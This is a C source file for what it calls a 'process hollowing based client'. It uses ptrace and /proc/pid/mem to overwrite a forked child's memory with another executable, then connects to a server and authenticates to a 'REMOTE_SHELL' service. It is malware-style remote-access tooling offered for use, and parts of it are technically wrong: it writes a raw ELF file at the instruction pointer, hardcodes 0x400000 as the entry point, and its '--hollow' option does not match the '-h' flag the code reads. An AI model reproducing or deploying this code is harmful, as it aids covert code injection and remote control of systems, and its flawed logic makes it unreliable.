#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/user.h> // For user_regs_struct
#include <signal.h>

// process hollowing based client

#define DEFAULT_SERVER_PORT "27015"
#define DEFAULT_SERVER_IP "127.0.0.1"
#define BUFFER_SIZE 1024

void error_exit(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [-i <ip/domain>] [-p <port>] [-w <password>] [--hollow <target_executable>]\n", prog_name);
}

int authenticate(int sockfd, const char *cmd_line_password) {
    static char password_buffer[BUFFER_SIZE];

    if (cmd_line_password) {
        strncpy(password_buffer, cmd_line_password, BUFFER_SIZE - 1);
        password_buffer[BUFFER_SIZE - 1] = '\0';
    } else {
        printf("Enter server password: ");
        if (fgets(password_buffer, BUFFER_SIZE, stdin) == NULL) {
            fprintf(stderr, "Failed to read password.\n");
            return 0;
        }
        password_buffer[strcspn(password_buffer, "\n")] = '\0';
    }

    if (send(sockfd, password_buffer, strlen(password_buffer), 0) < 0) {
        perror("Failed to send password");
        return 0;
    }

    char recv_buffer[BUFFER_SIZE];
    ssize_t received = recv(sockfd, recv_buffer, BUFFER_SIZE - 1, 0);
    if (received < 0) {
        perror("Failed to receive authentication response");
        return 0;
    }

    recv_buffer[received] = '\0';
    if (strcmp(recv_buffer, "REMOTE_SHELL_CONFIRMED\n") == 0) {
        printf("Authentication successful.\n");
        return 1;
    } else {
        printf("Authentication failed: %s\n", recv_buffer);
        return 0;
    }
}

int resolve_address(const char *host, const char *port, struct addrinfo **result) {
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int status = getaddrinfo(host, port, &hints, result);
    if (status != 0) {
        fprintf(stderr, "Error resolving address '%s': %s\n", host, gai_strerror(status));
        return 0;
    }
    return 1;
}

void hollow_process(const char *target_executable) {
    pid_t pid = fork();

    if (pid == -1) {
        error_exit("Failed to fork process");
    }

    if (pid == 0) {
        // Child process: Raise SIGSTOP immediately
        raise(SIGSTOP);
        exit(EXIT_SUCCESS);
    } else {
        // Parent process
        int status;
        struct user_regs_struct regs;
        char mem_path[BUFFER_SIZE];
        int mem_fd;
        void *entry_point;
        struct stat st;

        // Wait for child to stop
        waitpid(pid, &status, 0);
        if (!WIFSTOPPED(status)) {
            error_exit("Child process did not stop");
        }

        // Attach to the child process
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
            error_exit("Failed to attach to process");
        }

        waitpid(pid, &status, 0);
        if (!WIFSTOPPED(status)) {
            error_exit("Failed to attach to child process");
        }

        // Get the register state of the child process
        if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
            error_exit("Failed to get child process registers");
        }

        // Open the target executable
        int target_fd = open(target_executable, O_RDONLY);
        if (target_fd == -1) {
            error_exit("Failed to open target executable");
        }

        // Get the size of the executable
        if (fstat(target_fd, &st) == -1) {
            error_exit("Failed to get target executable size");
        }

        // Map the executable into memory
        void *target_memory = malloc(st.st_size);
        if (!target_memory) {
            error_exit("Failed to allocate memory for executable");
        }

        if (read(target_fd, target_memory, st.st_size) != st.st_size) {
            error_exit("Failed to read target executable into memory");
        }

        close(target_fd);

        // Write the new executable to the child's memory
        snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
        mem_fd = open(mem_path, O_WRONLY);
        if (mem_fd == -1) {
            error_exit("Failed to open child process memory");
        }

        if (lseek(mem_fd, regs.rip, SEEK_SET) == -1) {
            error_exit("Failed to seek to instruction pointer");
        }

        if (write(mem_fd, target_memory, st.st_size) != st.st_size) {
            error_exit("Failed to write to child process memory");
        }

        close(mem_fd);
        free(target_memory);

        // Update the instruction pointer to the new entry point
        entry_point = (void *)0x400000; // Default ELF entry point
        regs.rip = (unsigned long)entry_point;

        if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
            error_exit("Failed to set child process registers");
        }

        // Detach and resume the child process
        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {
            error_exit("Failed to detach from child process");
        }

        if (kill(pid, SIGCONT) == -1) {
            error_exit("Failed to resume child process");
        }

        printf("Process hollowing completed successfully.\n");
    }
}

int main(int argc, char *argv[]) {
    char server_input[BUFFER_SIZE] = DEFAULT_SERVER_IP;
    char server_port[BUFFER_SIZE] = DEFAULT_SERVER_PORT;
    char *password = NULL;
    char *hollow_target = NULL;

    int opt;
    while ((opt = getopt(argc, argv, "i:p:w:h:")) != -1) {
        switch (opt) {
            case 'i':
                strncpy(server_input, optarg, BUFFER_SIZE - 1);
                break;
            case 'p':
                strncpy(server_port, optarg, BUFFER_SIZE - 1);
                break;
            case 'w':
                password = optarg;
                break;
            case 'h':
                hollow_target = optarg;
                break;
            default:
                print_usage(argv[0]);
                return EXIT_FAILURE;
        }
    }

    if (hollow_target) {
        hollow_process(hollow_target);
    }

    struct addrinfo *res;
    if (!resolve_address(server_input, server_port, &res)) {
        fprintf(stderr, "Failed to resolve server address.\n");
        return EXIT_FAILURE;
    }

    // Establish a connection and authenticate
    int sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd < 0) {
        error_exit("Failed to create socket");
    }

    if (connect(sockfd, res->ai_addr, res->ai_addrlen) < 0) {
        error_exit("Failed to connect to server");
    }

    if (!authenticate(sockfd, password)) {
        close(sockfd);
        return EXIT_FAILURE;
    }

    // Additional communication logic here...

    close(sockfd);
    freeaddrinfo(res);
    return EXIT_SUCCESS;
}